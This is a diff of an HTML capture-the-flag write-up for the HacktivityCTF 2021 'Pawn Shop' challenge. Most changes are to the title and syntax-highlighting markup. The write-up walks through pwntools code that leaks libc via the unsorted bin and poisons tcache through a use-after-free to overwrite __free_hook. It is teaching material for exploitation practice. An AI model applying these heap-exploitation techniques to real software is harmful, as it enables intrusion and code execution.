@@ -2,7 +2,7 @@
 <html>
 <head>
 	<meta charset="utf-8">
-	<title>HacktivityCTF 2021 pawn shop challenge writeup</title>
+	<title>HacktivityCTF 2021 - Pawn Shop</title>
 	
 	<meta name="author" content="stdnoerr">
 
@@ -138,7 +138,7 @@
 
 	<div class="col-sm-9 col-sm-offset-3">
 		<div class="page-header">
-  <h1>HacktivityCTF 2021 pawn shop challenge writeup </h1>
+  <h1>HacktivityCTF 2021 - Pawn Shop </h1>
 </div>
 	
 <article>
@@ -157,9 +157,9 @@
 <h1 id="analysis">Analysis</h1>
 <h2 id="source-code-analysis">Source Code Analysis</h2>
 <p>Source code was not avaible during the CTF, but for the purpose of this writeup, I asked the author to give me the source code. Below is the source code: -</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
 </span>
 <span class="cp">#define ITEM_LIST_SIZE 10
 #define BUF_LEN 8
@@ -496,78 +496,78 @@ We will use this feature/behaviour of unsorted bin for getting libc leak.</p>
 <h1 id="exploitation">Exploitation</h1>
 <p>While doing heap exploitation challenges, it is advisible to make dedicated functions for each option of the menu. I also like to make an indexing mechanism like the one used in the program, so I don’t have to remember indices. Following are my wrapper functions: -</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">indexes</span> <span class="o">=</span> <span class="p">[</span><span class="bp">False</span><span class="p">]</span><span class="o">*</span><span class="mi">11</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
     <span class="k">global</span> <span class="n">p</span>
     <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'challenge.ctf.games'</span><span class="p">,</span> <span class="mi">31561</span><span class="p">)</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">challenge.ctf.games</span><span class="sh">'</span><span class="p">,</span> <span class="mi">31561</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">path</span><span class="p">})</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">(</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">LD_PRELOAD</span><span class="sh">"</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">path</span><span class="p">})</span>
 
 <span class="k">def</span> <span class="nf">attach_gdb</span><span class="p">():</span>
     <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span> <span class="ow">or</span> <span class="n">args</span><span class="p">.</span><span class="n">NOGDB</span><span class="p">:</span>
         <span class="k">return</span>
     
-    <span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s">'''
+    <span class="nf">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="sh">'''</span><span class="s">
     // for gdb-gef
     heap chunks
     heap bins
     continue
-    '''</span><span class="p">)</span>
-    <span class="nb">input</span><span class="p">(</span><span class="s">"ATTACHED?"</span><span class="p">)</span>
+    </span><span class="sh">'''</span><span class="p">)</span>
+    <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">ATTACHED?</span><span class="sh">"</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">b2f</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
-    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'&lt;d'</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="k">return</span> <span class="nf">str</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;d</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
 
 <span class="k">def</span> <span class="nf">i2f</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">b2f</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
+    <span class="k">return</span> <span class="nf">b2f</span><span class="p">(</span><span class="nf">p64</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">sendchoice</span><span class="p">(</span><span class="n">choice</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">choice</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="n">choice</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">buy_item</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
-    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'B'</span><span class="p">)</span>
+    <span class="nf">sendchoice</span><span class="p">(</span><span class="sh">'</span><span class="s">B</span><span class="sh">'</span><span class="p">)</span>
 
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'buy?: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">buy?: </span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
 
-<span class="k">def</span> <span class="nf">manage_item</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">new_name</span><span class="p">:</span> <span class="nb">bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'stdnoerr'</span><span class="p">,</span> <span class="n">new_price</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">123</span><span class="p">,</span> <span class="n">new_len</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">):</span>
-    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'M'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">manage_item</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">new_name</span><span class="p">:</span> <span class="nb">bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">stdnoerr</span><span class="sh">'</span><span class="p">,</span> <span class="n">new_price</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">123</span><span class="p">,</span> <span class="n">new_len</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">):</span>
+    <span class="nf">sendchoice</span><span class="p">(</span><span class="sh">'</span><span class="s">M</span><span class="sh">'</span><span class="p">)</span>
 
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'?: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">i2f</span><span class="p">(</span><span class="n">new_price</span><span class="p">)</span> <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">new_price</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span> <span class="k">else</span> <span class="n">new_price</span><span class="p">)</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">new_len</span><span class="p">))</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">new_name</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">?: </span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="nf">i2f</span><span class="p">(</span><span class="n">new_price</span><span class="p">)</span> <span class="k">if</span> <span class="nf">type</span><span class="p">(</span><span class="n">new_price</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span> <span class="k">else</span> <span class="n">new_price</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">new_len</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="n">new_name</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">sell_item</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">price</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">123</span><span class="p">,</span> <span class="n">name_len</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">):</span>
-    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'S'</span><span class="p">)</span>
+    <span class="nf">sendchoice</span><span class="p">(</span><span class="sh">'</span><span class="s">S</span><span class="sh">'</span><span class="p">)</span>
 
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">i2f</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">name_len</span><span class="p">))</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="nf">i2f</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">name_len</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
 
-    <span class="k">if</span> <span class="n">indexes</span><span class="p">.</span><span class="n">count</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
-        <span class="n">ret</span> <span class="o">=</span> <span class="n">indexes</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">indexes</span><span class="p">.</span><span class="nf">count</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="n">indexes</span><span class="p">.</span><span class="nf">index</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
         <span class="n">indexes</span><span class="p">[</span><span class="n">ret</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
         <span class="k">return</span> <span class="n">ret</span> <span class="o">+</span> <span class="mi">1</span>
     
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">"No index available"</span><span class="p">)</span>
+        <span class="k">raise</span> <span class="nc">Exception</span><span class="p">(</span><span class="sh">"</span><span class="s">No index available</span><span class="sh">"</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">leave</span><span class="p">():</span>
-    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'L'</span><span class="p">)</span>
+    <span class="nf">sendchoice</span><span class="p">(</span><span class="sh">'</span><span class="s">L</span><span class="sh">'</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">print_items</span><span class="p">():</span>
-    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'P'</span><span class="p">)</span>
+    <span class="nf">sendchoice</span><span class="p">(</span><span class="sh">'</span><span class="s">P</span><span class="sh">'</span><span class="p">)</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./pawned'</span><span class="p">)</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc_2.31.so'</span><span class="p">)</span>
-<span class="n">start</span><span class="p">()</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./pawned</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./libc_2.31.so</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">start</span><span class="p">()</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 <h2 id="the-plan">The plan</h2>
 <p>Our objective is to get a shell. In heap exploitation, it is done by overwriting one/few of <code class="language-plaintext highlighter-rouge">__malloc_hook</code>, <code class="language-plaintext highlighter-rouge">__free_hook</code>, <code class="language-plaintext highlighter-rouge">__realloc_hook</code> etc with <code class="language-plaintext highlighter-rouge">system</code> or <code class="language-plaintext highlighter-rouge">one gadget</code>. Because, these functions are used in the program and the overwritten value will be called on each invocation of the corresponding function.<br />
@@ -582,20 +582,20 @@ For this, we need an arbitrary write primitive and a libc leak. So, exploitation
 To put a chunk in unsorted bin, we first need to fill tcache of the chunk’s size, so it doesn’t end up in tcachebin. Moreover, the chunk should have (actual) size greater than or equal to <code class="language-plaintext highlighter-rouge">0x90</code>, otherwise the chunk will end up in fastbin and we won’t get libc leak.<br />
 I chose <code class="language-plaintext highlighter-rouge">0x90</code> for libc leak (passing <code class="language-plaintext highlighter-rouge">0x80</code> will give a <code class="language-plaintext highlighter-rouge">0x90</code> sized chunk). Lets fill tcachebin of this size.<br />
 For this, you just need to allocate <code class="language-plaintext highlighter-rouge">7</code> chunks and free them. Be careful, don’t allocate a chunk and immediately free it because you will end up allocating and freeing the same chunk. Just allocate <code class="language-plaintext highlighter-rouge">7</code> chunks and free them later.</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="n">sell_item</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="nf">sell_item</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
 
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="n">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="nf">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
 </code></pre></div></div>
 <p>This fills tcachebin for size <code class="language-plaintext highlighter-rouge">0x90</code>.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tcachebins[idx=1, size=0x30] count=7  ←  Chunk(addr=0x56207bb2a720, size=0x30, flags=PREV_INUSE)  ←  [...]                  
 Tcachebins[idx=7, size=0x90] count=7  ←  Chunk(addr=0x56207bb2a750, size=0x90, flags=PREV_INUSE)  ←  [...]
 </code></pre></div></div>
 <p>Now, we need another chunk for putting into unsorted bin. Maybe allocate a chunk just after the ones used for tcachebin filling.</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="n">sell_item</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
-<span class="n">a</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'stdnoerr'</span><span class="p">)</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="nf">sell_item</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
+<span class="n">a</span> <span class="o">=</span> <span class="nf">sell_item</span><span class="p">(</span><span class="sh">'</span><span class="s">stdnoerr</span><span class="sh">'</span><span class="p">)</span>
 
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="n">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-<span class="n">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="nf">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+<span class="nf">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 </code></pre></div></div>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tcachebins[idx=1, size=0x30] count=7  ←  [...]                                          
 Tcachebins[idx=7, size=0x90] count=7  ←  [...]
@@ -631,11 +631,11 @@ Actually, the chunk got consolidated into <code class="language-plaintext highli
 </code></pre></div></div>
 <p>To prevent this, you can allocate another chunk or allocate the chunk to be put in unsortebin at start.<br />
 I chose the latter. Just move the allocation above the tcache ones.</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'stdnoerr'</span><span class="p">)</span>
-<span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="n">sell_item</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="nf">sell_item</span><span class="p">(</span><span class="sh">'</span><span class="s">stdnoerr</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="nf">sell_item</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
 
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="n">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-<span class="n">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="nf">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+<span class="nf">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 </code></pre></div></div>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tcachebins[idx=1, size=0x30] count=7  ←  [...]                                                    
 Tcachebins[idx=7, size=0x90] count=7  ←  [...]                                          
@@ -657,15 +657,15 @@ Fastbins[idx=6, size=0x80] 0x00
 [+] Found 0 chunks in 0 large non-empty bins.
 </code></pre></div></div>
 <p>Now, we just need to read the pointer(s) using <code class="language-plaintext highlighter-rouge">print_items</code> option. You can calculate libc offset in gdb and use that to calculate libc base address.</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'stdnoerr'</span><span class="p">)</span>
-<span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="n">sell_item</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="nf">sell_item</span><span class="p">(</span><span class="sh">'</span><span class="s">stdnoerr</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="nf">sell_item</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
 
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="n">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-<span class="n">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="nf">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+<span class="nf">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 
-<span class="n">print_items</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Name: '</span><span class="p">)</span>
-<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="nf">print_items</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="s">Name: </span><span class="sh">'</span><span class="p">)</span>
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
 <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x1ebbe0</span> <span class="c1"># main_arena + 96
 </span></code></pre></div></div>
 <p>Now that we have calculated the libc base address, we have addresses of <code class="language-plaintext highlighter-rouge">__malloc_hook</code>, <code class="language-plaintext highlighter-rouge">__free_hook</code> etc. You just have to decide which one you want to overwrite.<br />
@@ -711,18 +711,18 @@ Notice that there are no checks on the pointer to be returned, whether it points
 So, if we could somehow overwrite the <code class="language-plaintext highlighter-rouge">next</code> pointer value, we can get an arbitrary pointer.</p>
 
 <p>Because of the UAF, we can change <code class="language-plaintext highlighter-rouge">next</code> pointer. I overwrite <code class="language-plaintext highlighter-rouge">next</code> pointer of <code class="language-plaintext highlighter-rouge">tcache[-1]</code> (remember LIFO) by changing its <code class="language-plaintext highlighter-rouge">name</code> to address of <code class="language-plaintext highlighter-rouge">__free_hook</code> using <code class="language-plaintext highlighter-rouge">manage_items</code> function. This will return us <code class="language-plaintext highlighter-rouge">__free_hook</code> through <code class="language-plaintext highlighter-rouge">tcachebin[0x90]</code>.</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'stdnoerr'</span><span class="p">)</span>
-<span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="n">sell_item</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="nf">sell_item</span><span class="p">(</span><span class="sh">'</span><span class="s">stdnoerr</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="nf">sell_item</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
 
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="n">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-<span class="n">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="nf">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+<span class="nf">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 
-<span class="n">print_items</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Name: '</span><span class="p">)</span>
-<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="nf">print_items</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="s">Name: </span><span class="sh">'</span><span class="p">)</span>
